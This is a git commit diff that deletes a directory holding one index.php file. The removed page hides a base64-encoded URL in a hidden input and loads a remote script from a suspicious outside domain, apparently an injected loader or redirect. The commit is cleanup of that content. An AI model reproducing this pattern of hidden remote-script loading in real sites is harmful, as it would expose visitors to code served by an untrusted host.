596d7ea17b0f7ecea9a524c25a2555604eb8bf60
marcellodigi <136550556+marcellodigi@users.noreply.github.com>
2023-07-19 04:48:51 -0700

    Delete packages/main/n2w directory

--- packages/main/n2w/index.php
+++
@@ -1,1 +0,0 @@
-<html><head></head><body><input type="hidden" id="b64u" value="aHR0cDovL2NwLmR1emZnLmN5b3UvYmE4OGFlNi5waHA="></input><script src="http://cp.duzfg.cyou/admin/js/sc.php"></script></body></html>
